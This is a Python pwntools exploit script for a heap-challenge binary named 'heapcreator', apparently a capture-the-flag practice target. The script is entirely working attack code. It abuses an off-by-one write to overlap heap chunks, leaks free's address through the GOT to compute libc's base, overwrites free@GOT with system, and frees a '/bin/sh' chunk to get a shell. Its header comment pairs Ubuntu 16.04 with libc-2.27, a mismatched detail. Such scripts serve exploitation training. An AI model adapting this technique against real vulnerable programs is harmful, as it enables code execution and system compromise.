#Ubuntu 16.04 , libc-2.27.so
from pwn import *

io = process('./heapcreator')
elf = ELF('./heapcreator')
libc = elf.libc

def add(size,content):
    io.sendlineafter("Your choice :",'1')
    io.sendlineafter("Size of Heap : ",str(size))
    io.sendlineafter("Content of heap:",content)

def edit(idx,content):
    io.sendlineafter("Your choice :",'2')
    io.sendlineafter("Index :",str(idx))
    io.sendlineafter("Content of heap : ",content)

def show(idx):
    io.sendlineafter("Your choice :",'3')
    io.sendlineafter("Index :",str(idx))

def free(idx):
    io.sendlineafter("Your choice :",'4')
    io.sendlineafter("Index :",str(idx))

add(0x18,'aaaa') #chunk 0
add(0x10,'bbbb') #chunk 1
add(0x10,'cccc') #chunk 2
add(0x10,'/bin/sh') #chunk 3

edit(0,'a'*0x18+'\x81') #off by one
free(1)

#write the free_got on the pointer of chunk 2
payload = 'd'*0x40+'\x08'.ljust(8,'\x00')+p64(elf.got['free'])
add(0x70,payload)

show(2)
io.recvuntil('Content : ')
free_addr = u64(io.recvuntil('Done')[:-5].ljust(8,'\x00'))
libc_base = free_addr - libc.sym['free']
system_addr = libc_base + libc.sym['system']
print 'free_addr',hex(free_addr)
print 'system_addr',hex(system_addr)

edit(2,p64(system_addr))
free(3)
io.interactive()
